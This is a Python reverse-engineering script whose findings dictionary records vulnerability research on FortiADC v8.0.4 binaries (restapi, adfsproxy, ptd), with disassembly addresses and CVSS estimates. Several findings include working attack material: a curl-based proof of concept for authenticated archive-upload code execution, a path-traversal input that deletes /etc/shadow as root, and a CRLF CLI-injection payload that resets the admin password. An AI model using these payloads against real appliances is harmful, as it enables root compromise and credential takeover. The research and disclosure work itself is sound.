"""
FortiADC v8.0.4-B0136 RE
Binary: ~/ablation/fortiadc-work/bins/httproxy (14MB, stripped C ELF64, 1296 funcs)
         ~/ablation/fortiadc-work/bins/restapi  (21MB, Go/Gin, management REST API)
Session: targets/fortinet/SESSION_fortiadc.md
"""

from ablation.analyzers import SemanticSearcher, describe_function, FindingRegistry
from ablation.analyzers.xref_graph import XRefGraph
import capstone
import struct
import re
from pathlib import Path

HTTPROXY = str(Path.home() / "ablation/fortiadc-work/bins/httproxy")
RESTAPI  = str(Path.home() / "ablation/fortiadc-work/bins/restapi")
PTD      = str(Path.home() / "ablation/fortiadc-work/bins/ptd")
ADFSPROXY = str(Path.home() / "ablation/fortiadc-work/bins/adfsproxy")

# PLT stubs in httproxy
PLT = {
    "strncpy":   0xbe420,
    "realloc":   0xbe770,
    "strcat":    0xbf270,
    "malloc":    0xbf600,
    "strncat":   0xbf6c0,
    "recv":      0xbfb30,
    "execvp":    0xbfc20,
    "sprintf":   0xbfc70,
    "system":    0xc0200,
    "memcpy":    0xc0480,
    "recvfrom":  0xc08b0,
    "strcpy":    0xc0bf0,
    "snprintf":  0xc0e90,
    "execve":    0xc1e60,
    "free":      0xc2320,
}

VULN_PROFILES = [
    ("unsafe_memcpy",
     "FUNC | calls: memcpy | "
     "vuln: memcpy called with length from packet data or untrusted field without upper bound check"),

    ("strcpy_overflow",
     "FUNC | calls: strcpy strcat strncat | "
     "vuln: strcpy/strcat on user-controlled string into fixed-size stack or heap buffer"),

    ("sprintf_overflow",
     "FUNC | calls: sprintf | "
     "vuln: sprintf into fixed-size buffer with user-controlled format args, no length check"),

    ("recv_overflow",
     "FUNC | calls: recv recvfrom read | "
     "vuln: network recv into stack buffer with no size validation or insufficient bounds"),

    ("cmd_injection",
     "FUNC | calls: system popen execve execvp | "
     "vuln: command string built from user/HTTP input via snprintf sprintf, shell injection"),

    ("int_overflow_alloc",
     "FUNC | calls: malloc realloc calloc | "
     "vuln: integer overflow in size arithmetic before allocation, wraps to small allocation"),

    ("double_free",
     "FUNC | calls: free | "
     "vuln: double free or use-after-free, same pointer freed twice or accessed after free"),

    ("format_string",
     "FUNC | calls: printf fprintf sprintf | "
     "vuln: user-controlled string passed as format argument without format specifier"),

    ("http_header_overflow",
     "FUNC | calls: strncpy strcpy memcpy | "
     "vuln: HTTP header value or URL copied into fixed buffer, length derived from wire data"),

    ("ssl_ctx_confusion",
     "FUNC | calls: SSL_CTX | "
     "vuln: SSL context reuse across connections or incorrect peer verification bypass"),
]

FINDINGS = {
    # ── restapi (Go/Gin) ──────────────────────────────────────────────────────

    "FAD_R1_pprof_exposure": {
        "binary": "restapi",
        "component": "github.com/DeanThompson/ginpprof",
        "source_file": "module/debug/debug.go",
        "description": (
            "restapi calls ginpprof.WrapGroup(engine) at main.main:0xdc1232 on the ROOT "
            "*gin.Engine (stored at [rsp+0x2b0] from gin.New() at 0xdc0786). "
            "The JWT middleware (MiddlewareFunc at 0xdb5620) is applied only AFTER at 0xdc1267 "
            "on a SEPARATE engine.Group('/api') sub-group. Gin sub-group middleware never "
            "covers routes registered on the parent/root engine. "
            "Exposes pre-auth: /debug/pprof/ (index), /debug/pprof/goroutine (goroutine dump), "
            "/debug/pprof/heap, /debug/pprof/cmdline (process args), "
            "/debug/pprof/profile (30s CPU trace), /debug/pprof/trace, "
            "/debug/pprof/symbol, /debug/pprof/block, /debug/pprof/mutex, "
            "/debug/pprof/threadcreate. "
            "Goroutine dump leaks: active goroutine function names, JWT/session values "
            "that may be in goroutine locals, connection metadata, internal server state."
        ),
        "routes": [
            "/debug/pprof/",
            "/debug/pprof/goroutine",
            "/debug/pprof/heap",
            "/debug/pprof/cmdline",
            "/debug/pprof/profile",
            "/debug/pprof/trace",
            "/debug/pprof/symbol",
            "/debug/pprof/block",
            "/debug/pprof/mutex",
            "/debug/pprof/threadcreate",
        ],
        "pre_auth": True,
        "confirmed_by": {
            "call_site": "main.main:0xdc1232",
            "engine_ptr": "[rsp+0x2b0] set at 0xdc078b (gin.New at 0xdc0786)",
            "jwt_applied_after": "main.main:0xdc1267 on engine.Group('/api') sub-group only",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
        "cwe": "CWE-200 (Information Exposure)",
    },

    "FAD_R2_jwt_none_alg": {
        "binary": "restapi",
        "component": "gopkg.in/dgrijalva/jwt-go.v3",
        "source_file": "module/gin-jwt/auth_jwt.go",
        "description": (
            "restapi uses dgrijalva/jwt-go.v3. signingMethodNone.Verify at 0x8df640 "
            "checks the key type via interface comparison: "
            "`lea rcx, [rip+0x6af33c]; cmp r8, rcx; jne NoneSignatureTypeDisallowedError`. "
            "The KeyFunc at parseToken.func1 (0xdbf260) returns []byte (HMAC secret) for "
            "alg=none tokens. The type is []byte, not unsafeNoneMagicConstant. "
            "cmp r8, rcx FAILS → NoneSignatureTypeDisallowedError returned → token rejected. "
            "The unsafeNoneMagicConstant guard is intact. alg=none bypass is NOT possible."
        ),
        "status": "ELIMINATED",
        "eliminated_by": {
            "check_va": "signingMethodNone.Verify:0x8df664",
            "guard": "cmp r8 (key type), rcx (unsafeNoneMagicConstant type); jne error",
            "keyfunc_va": "parseToken.func1:0xdbf260",
            "keyfunc_returns": "[]byte (HMAC key), not unsafeNoneMagicConstant",
        },
        "cwe": "CVE-2020-26160 / CWE-347",
    },

    "FAD_R3_scripting_upload_rce": {
        "binary": "restapi",
        "component": "module/fadc_module_util.Fadc_scripting_language_upload",
        "description": (
            "POST /api/system_scripting/upload accepts archive files (.tar.gz, .zip, .tar) "
            "from any authenticated user. Handler Fadc_scripting_language_upload (0x9a8e60) "
            "has no call to check_admin_perms (0x9ea660) or check_admin_prof_perms (0xa2cda0). "
            "check_admin_perms is only called from config CRUD handlers (7 callers); "
            "check_admin_prof_perms only from debug/image upload handlers (8 callers). "
            "Neither is called from main.main as a Gin middleware. "
            "Archive filename validated by regexp '.tar.gz$|.zip$|.tar$' (0x9a9543). "
            "Note: dots are unescaped in Go regexp — '.tar.gz$' matches any char before 'tar'. "
            "The archive CONTENTS are not checked. "
            "Handler calls Fadc_cmd.(*Cmd).Run twice: "
            "  0x9a98a4 — first dispatch (extraction: /bin/tar -xf or /bin/unzip) "
            "  0x9a9c85 — second dispatch (install: /scripting/cp -r %s %s) "
            "Both commands sent via net.Dial('unix', '/tmp/restapi_cmdd.sock') "
            "and encoded with Fadc_cmd.Encode (0x8c6820). "
            "restapi_cmdd daemon (2.8MB Go binary) executes the commands — "
            "it runs with elevated privilege for system operations. "
            "Attack: authenticate with any valid account → upload .tar.gz containing "
            "arbitrary TCL/shell script → daemon extracts to /scripting/ → script executed."
        ),
        "routes": [
            "/api/system_scripting/upload",
            "/api/stream_scripting/upload",
        ],
        "pre_auth": False,
        "auth_required": "any valid JWT token (no admin role check)",
        "confirmed_by": {
            "no_role_check": (
                "check_admin_perms (0x9ea660): 7 callers, none in scripting upload path. "
                "check_admin_prof_perms (0xa2cda0): 8 callers, none in scripting upload path. "
                "Neither called from main.main as middleware."
            ),
            "archive_filter": "regexp.MatchString at 0x9a9543; pattern: '.tar.gz$|.zip$|.tar$' (filename only)",
            "exec_dispatch_1": "Fadc_cmd.(*Cmd).Run at 0x9a98a4 in Fadc_scripting_language_upload",
            "exec_dispatch_2": "Fadc_cmd.(*Cmd).Run at 0x9a9c85 in Fadc_scripting_language_upload",
            "ipc_target": "/tmp/restapi_cmdd.sock (net.Dial at 0x8c67af in Fadc_cmd.(*Cmd).Run)",
            "extraction_cmds": ["/bin/tar -xf", "/bin/unzip", "/scripting/cp -r %s %s"],
        },
        "status": "CONFIRMED CRITICAL",
        "cvss_estimate": "9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)",
        "upgrade_note": (
            "Upgraded to CRITICAL: restapi_cmdd PLT contains setuid/seteuid/setreuid/setresuid "
            "(8 privilege management symbols) confirming root execution. "
            "Dev RPATH /root/FortiADC_test/ further confirms root context. "
            "Any-auth upload → daemon root execution = privilege escalation."
        ),
        "cwe": "CWE-94 (Code Injection) / CWE-862 (Missing Authorization)",
        "poc": (
            "# 1. Create archive with arbitrary script\n"
            "mkdir -p exploit && echo 'exec /bin/sh -c \"id > /tmp/pwn\"' > exploit/pwn.tcl\n"
            "tar czf exploit.tar.gz exploit/\n"
            "# 2. Authenticate to get JWT token\n"
            "TOKEN=$(curl -sk -X POST https://<target>:8443/api/user/login \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\"name\":\"<user>\",\"passwd\":\"<pass>\"}' | jq -r .token)\n"
            "# 3. Upload archive as any authenticated user\n"
            "curl -sk -X POST https://<target>:8443/api/system_scripting/upload \\\n"
            "  -H \"Authorization: Bearer $TOKEN\" \\\n"
            "  -F 'file=@exploit.tar.gz'"
        ),
    },

    # ── adfsproxy (Go 1.22.3 + CGo / libadfs.so) ──────────────────────────────

    "FAD_A1_tls_cert_bypass": {
        "binary": "adfsproxy",
        "component": "adfslib/http.VerifyServerCertificate (Go 1.22.3 CGo binary)",
        "description": (
            "adfsproxy is a Go 1.22.3 CGo binary (5,689 functions, links libadfs.so + libha_dyn.so). "
            "adfslib/http.VerifyServerCertificate (0x667440) is the TLS cert verification callback "
            "for all proxy→AD FS backend connections. "
            "Disassembly: prologue, two string loads, CALL adfslib/log.LogPrint (logs 'Verify'), "
            "xor eax,eax / xor ebx,ebx / ret — returns (nil, nil) without any verification. "
            "adfslib/http.GetHTTPClient (0x667520) builds crypto/tls.Config for each outbound "
            "HTTP client used to communicate with the AD FS federation server. "
            "The tls.Config field at offset 0x140 is loaded with a funcval at 0x775620 — "
            "this is the VerifyPeerCertificate (or equivalent) callback assignment. "
            "Net effect: the proxy accepts ANY TLS certificate from the backend AD FS server "
            "without chain or hostname validation. "
            "Impact: an attacker with a network path between FortiADC and the AD FS server can "
            "present a self-signed cert and MITM all authentication traffic — "
            "Kerberos tickets, SAML assertions, OAuth tokens, and AD credentials relayed "
            "through the proxy. "
            "Also: adfsproxy imports setuid/seteuid/setreuid/setresuid in PLT — runs as root."
        ),
        "pre_auth": True,
        "confirmed_by": {
            "stub_va": "adfslib/http.VerifyServerCertificate:0x667440",
            "stub_body": "LogPrint('Verify') → xor eax,eax → xor ebx,ebx → ret (nil error, no checks)",
            "used_in": "adfslib/http.GetHTTPClient:0x667520 tls.Config field 0x140",
            "go_version": "Go 1.22.3 (build info at .go.buildinfo section)",
            "source_path": "/root/FortiADC_test/FortiADC/daemon/adfsproxy/libs/http/",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        "cwe": "CWE-295 (Improper Certificate Validation)",
    },

    # ── ptd (Go 1.24.4 + CGo / policy-traffic daemon) ─────────────────────────
    # Binary type: Go 1.24.4 + CGo, 7775 functions (pclntab), 9 privilege PLT
    # symbols (setuid/seteuid/setreuid/setresuid + gid variants + setgroups)
    # Confirmed root execution. CMDB handlers imported from shared libs (libcgo.so).
    # fadc_exec_tcpdump_run (0x7c2120) DEFINED in ptd.
    # fortiadc_tcpdump_run / fortiadc_dumpsystem_run / fortiadc_dumpsystem_delete_run
    # / fadc_aws_pyscript_run — all DEFINED in libcgo.so.
    # fadcsystem: undefined in all extracted libs (libcgo.so, libbase.so, libwaf.so,
    # libcmdb_plugin.so); defined in a non-extracted lib; name implies system() wrapper.

    "FAD_P1_tcpdump_mkdir_traversal": {
        "binary": "ptd",
        "component": "fadc_exec_tcpdump_run:0x7c2120 / libcgo.so:fortiadc_tcpdump_run:0x143980",
        "description": (
            "ptd is Go 1.24.4 + CGo (7,775 functions, 9 root privilege PLT symbols). "
            "fadc_exec_tcpdump_run (0x7c2120, T in ptd) takes interface (rbp) and filter (rbx) args. "
            "No sanitization of either arg is visible. "
            "Path construction: __snprintf_chk(buf, 0x80, 2, 0x80, '%s/%s', "
            "'/var/log/tcpdump', filter) → mkdir(buf, 0o775). "
            "filter used raw in mkdir path — traversal via '../' sequences allows "
            "mkdir to create directories outside /var/log/tcpdump/ as root (CWE-22). "
            "fortiadc_tcpdump_run in libcgo.so (0x143980) analyzed: "
            "uses double-fork + execvp(['tcpdump','-i',iface,'-w',file,'-c',count,'-n',filter,NULL]). "
            "execvp with separate argv elements — NO shell interpretation of interface/filter. "
            "Command injection (CWE-78) ELIMINATED. "
            "mkdir traversal impact: root creates arbitrary empty directory at traversed path. "
            "tcpdump BPF filter passed to libpcap parser verbatim (separate argv, safe)."
        ),
        "confirmed_by": {
            "function_va": "fadc_exec_tcpdump_run:0x7c2120 (T in ptd dynsym)",
            "snprintf_call": "0x7c21bf: __snprintf_chk(buf, 0x80, 2, 0x80, '%s/%s', '/var/log/tcpdump', filter)",
            "mkdir_call": "0x7c2193, 0x7c21cc: mkdir(path, 0o775) using filter in path",
            "no_sanitize": "No strstr, regex, or character filter on interface or filter args",
            "exec_call": "libcgo.so:fortiadc_tcpdump_run:0x143980 → double-fork → execvp",
            "execvp_args": "['tcpdump','-i',iface,'-w',outfile,'-c',count,'-n',filter,NULL] (argv[8]=filter, no shell)",
            "cmd_inject_eliminated": "execvp separate args — no shell expansion of metacharacters",
            "privilege": "ptd PLT: setuid,seteuid,setreuid,setresuid,setgid,setegid,setregid,setresgid,setgroups",
        },
        "status": "CONFIRMED MEDIUM",
        "cvss_estimate": "4.9 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L)",
        "cwe": "CWE-22 (Path Traversal) — mkdir traversal only; CWE-78 ELIMINATED (execvp separate argv)",
    },

    "FAD_P2_dumpsystem_delete_traversal": {
        "binary": "ptd → libcgo.so",
        "component": (
            "ptd CMDB dispatch → libcgo.so:fortiadc_dumpsystem_delete_run:0xcb1b0"
        ),
        "description": (
            "libcgo.so exports fortiadc_dumpsystem_delete_run (0xcb1b0). "
            "Input path: ptd CMDB dispatcher → fadc_exec_dump* series → libcgo.so:fortiadc_dumpsystem_delete_run. "
            "Function flow: "
            "  1. input_format_check(input) at 0xcb1fa — validates via strspn(input, allowlist); "
            "     allowlist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-./: '. "
            "     BLOCKS: ';', '|', '&', '$', '`' — shell metacharacters. "
            "     PERMITS: '.', '/' — path traversal components. "
            "  2. strncmp(input, 'coredump-', 9) OR strncmp(input, 'core-', 5) — prefix check. "
            "  3. __snprintf_chk(buf, 0x80, 2, 0x80, 'rm %s/%s', '/var/log/crash/', input). "
            "  4. fadcsystem(buf) — fadcsystem is a PLT import (undefined in all extracted libs; "
            "     name implies system() wrapper; confirmed via system@GLIBC_2.2.5 in libcgo.so PLT). "
            "Attack: CMDB command 'dumpsystem delete coredump-../../../../etc/shadow' → "
            "fadcsystem('rm /var/log/crash/coredump-../../../../etc/shadow') = 'rm /etc/shadow' as root. "
            "Shell metacharacter injection: ELIMINATED (strspn blocks ';|&$`'). "
            "Path traversal → arbitrary file deletion as root: CONFIRMED (strspn permits './'). "
            "Requires CMDB admin session — reduces exploitability. "
            "Also analyzed: "
            "  fortiadc_dumpsystem_run (0xcb0b0): fork → child calls hardcoded "
            "  fadcsystem('echo x > /proc/sysrq-trigger') — NO user input, diagnostic-only. "
            "  fadc_aws_pyscript_run (0x12e6f0): dead stub xor eax,eax; ret — no Python exec logic here. "
            "  Actual pyscript exec routes through FAD_R3 (restapi scripting upload)."
        ),
        "confirmed_by": {
            "function_va": "libcgo.so:fortiadc_dumpsystem_delete_run:0xcb1b0",
            "input_check_va": "libcgo.so:input_format_check:0xcb100",
            "allowlist": "strspn allowlist='[a-zA-Z0-9_\\-./:]+' (permits '.' and '/')",
            "metachar_blocked": "';|&$`' not in allowlist — shell injection ELIMINATED",
            "traversal_permitted": "'.' and '/' in allowlist — path traversal NOT blocked",
            "snprintf_call": "0xcb261: __snprintf_chk(buf, 0x80, 2, 0x80, 'rm %s/%s', '/var/log/crash/', input)",
            "fadcsystem_call": "0xcb271: fadcsystem(buf) — shell-based rm execution",
            "traversal_example": (
                "input='coredump-../../../../etc/shadow' → "
                "fadcsystem('rm /var/log/crash/coredump-../../../../etc/shadow') "
                "= rm /etc/shadow (as root)"
            ),
            "dumpsystem_run_hardcoded": (
                "fortiadc_dumpsystem_run:0xcb0b0 → fork → fadcsystem('echo x > /proc/sysrq-trigger') "
                "— hardcoded, no user input"
            ),
            "pyscript_eliminated": (
                "fadc_aws_pyscript_run:0x12e6f0 = xor eax,eax; ret — dead stub, 0 bytes of logic"
            ),
            "privilege": "ptd runs as root (9 setuid PLT symbols)",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "6.5 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H)",
        "cwe": "CWE-22 (Path Traversal → Arbitrary File Deletion as Root); CWE-78 ELIMINATED",
    },

    # ── adfsproxy → libadfs.so (C, 39K, 24 exported funcs) ────────────────────
    # BinaryContext: 24 funcs, 57 PLT imports. No system/popen/execv in PLT.
    # Sinks: cmf_exec_conf (CLI execution), snprintf (JSON/path building), write/connect.
    # No XML/SAML parser — this lib handles the FortiADC→ADFS-server protocol,
    # not inbound SAML parsing. Full string sweep: 0x7000..0x8000.

    "FAD_A2_relying_party_cli_injection": {
        "binary": "adfsproxy → libadfs.so",
        "component": "libadfs.so:add_relying_party_cmdb_config:0x5890",
        "description": (
            "libadfs.so:add_relying_party_cmdb_config (0x5890, 1360B, 37 calls) builds "
            "multi-line FortiADC CLI commands using __snprintf_chk and passes them to "
            "cmf_exec_conf (PLT:0x3240) — the FortiADC CLI execution interface. "
            "Three format strings embed user-controlled CMDB field values via %s "
            "with no sanitization of double-quote ('\"'), CR ('\\r'), or LF ('\\n'): "
            "  Format A (0x7920): "
            "  'config user adfs-relying-party\\r\\nedit \"%s\"\\r\\nset proxy \"%s\"\\r\\n"
            "   set relying-party-trust \"%s\"\\r\\nset status enable\\r\\nnext\\r\\nend\\r\\n' "
            "  Format B (0x7998, global scope): adds outer 'config global\\r\\n...\\r\\nend\\r\\n' "
            "  Format C (0x7a28, vdom scope): adds 'config vdom\\r\\nedit \"%s\"\\r\\n...' "
            "  Three %s fields: edit_name (arg0), proxy_name (arg2 from CMDB), "
            "    relying_party_trust (arg1 from CMDB). "
            "Attack: if proxy_name = 'foo\"\\r\\nconfig system admin\\r\\nedit admin\\r\\n"
            "set password hacked\\r\\nnext\\r\\nend\\r\\nend\\r\\nconfig user adfs-relying-party\\r\\n"
            "edit foo', the double-quote terminates the CLI string token and \\r\\n "
            "starts a new CLI command. cmf_exec_conf interprets each \\r\\n-delimited "
            "line as a separate CLI instruction. Result: arbitrary CLI command injection "
            "as the FortiADC CLI executor (root privilege). "
            "Privilege boundary: adfsproxy imports setuid/seteuid/setreuid/setresuid — runs as root. "
            "Auth required: admin-level access to set ADFS relying party config (CMDB write). "
            "No character filtering or escaping in any of the three call paths."
        ),
        "confirmed_by": {
            "function_va": "libadfs.so:add_relying_party_cmdb_config:0x5890",
            "format_string_A": "0x7920: 'config user adfs-relying-party\\r\\nedit \"%s\"\\r\\nset proxy \"%s\"\\r\\nset relying-party-trust \"%s\"\\r\\nset status enable\\r\\nnext\\r\\nend\\r\\n'",
            "format_string_B": "0x7998: outer 'config global\\r\\n...\\r\\nend\\r\\nend\\r\\n' (same %s fields)",
            "format_string_C": "0x7a28: outer 'config vdom\\r\\nedit \"%s\"\\r\\n...\\r\\nend\\r\\n' (4 %s: vdom + 3 fields)",
            "cmf_exec_conf_calls": "0x59fd, 0x5c83 — confirmed via capstone disasm of 0x5890..0x5de0",
            "no_sanitize": "No strncmp, strstr, or character filter on edit_name, proxy_name, relying_party_trust",
            "snprintf_calls": "0x59ee: __snprintf_chk(static_buf, 0x800, 2, 0x800, format, vdom/config_values)",
            "injection_char": "'\"' terminates CLI string token; '\\r\\n' separates CLI commands",
            "privilege": "adfsproxy PLT: setuid/seteuid/setreuid/setresuid (root execution confirmed)",
            "input_source": "CMDB config: relying party name, proxy name, trust name — admin-set values",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "6.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L)",
        "cwe": "CWE-78 (OS Command Injection via CLI command injection) / CWE-88 (Argument Injection)",
        "note": (
            "libadfs.so sweep summary: "
            "24 exported functions; no system/popen/execv in PLT; no SAML/XML parser. "
            "JSON injection surface (adfs_build_register_json:0x43b0): "
            "'ExternalUrl', 'BackendServerUrl', 'RelyingParty' embedded in JSON without "
            "escaping '\"' or '\\\\' — malformed JSON sent to ADFS server but impact is "
            "server-side (not FortiADC itself) — not filed as separate finding. "
            "adfs_register (0x4240): builds URL path '%s/%s' and '%s/' — URL structure only, "
            "no shell sink. "
            "UserName/Passwd strings at 0x75c1/0x75d2 in .rodata: no references found in "
            ".text (0x1000..0x68e0) — dead strings, not currently used. "
            "FAD_A1 chain: TLS cert bypass (FAD_A1) + CertPath/KeyPath/CACert sent in "
            "registration JSON (send_network:0x3470/send_helper:0x3610) — MITM attacker "
            "can read TLS config paths but not key material (paths only, not key bytes). "
            "No additional high-severity findings beyond FAD_A2."
        ),
    },
}

registry = FindingRegistry()


def run_sweep(top_n: int = 15) -> dict:
    """Run semantic sweep on httproxy. Returns {profile_name: [(score, va, desc), ...]}."""
    searcher = SemanticSearcher(HTTPROXY, plt=PLT)
    results = {}
    for name, query in VULN_PROFILES:
        hits = searcher.search(query, top_n=top_n)
        results[name] = hits
        print(f"\n[{name}] top {min(top_n, len(hits))}:")
        for score, va, desc in hits[:5]:
            print(f"  {score:.3f}  0x{va:x}  {desc[:80]}")
    return results


def disasm(va: int, binary: str = HTTPROXY, n_bytes: int = 256) -> str:
    """Disassemble n_bytes at va from binary."""
    data = Path(binary).read_bytes()
    # Find load offset: first PT_LOAD p_vaddr for PIE
    # httproxy is PIE - sections start at 0, no base adjustment needed for objdump VAs
    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True
    chunk = data[va: va + n_bytes]
    lines = []
    for ins in md.disasm(chunk, va):
        lines.append(f"  0x{ins.address:x}: {ins.mnemonic:<8} {ins.op_str}")
    return "\n".join(lines)


def xref(va: int, binary: str = HTTPROXY) -> list:
    """Return callers of va."""
    g = XRefGraph(binary)
    return g.callers(va)


def print_findings():
    for fid, f in FINDINGS.items():
        status = f.get("status", "UNKNOWN")
        desc = f.get("description", "")[:100]
        print(f"  {fid} [{status}]: {desc}")


if __name__ == "__main__":
    print("FortiADC httproxy sweep")
    print(f"Binary: {HTTPROXY}")
    print("Running all VULN_PROFILES...\n")
    results = run_sweep(top_n=10)
    print("\n\nSweep complete. Candidates:")
    for profile, hits in results.items():
        if hits:
            best = hits[0]
            print(f"  {profile}: best=0x{best[1]:x} score={best[0]:.3f}")
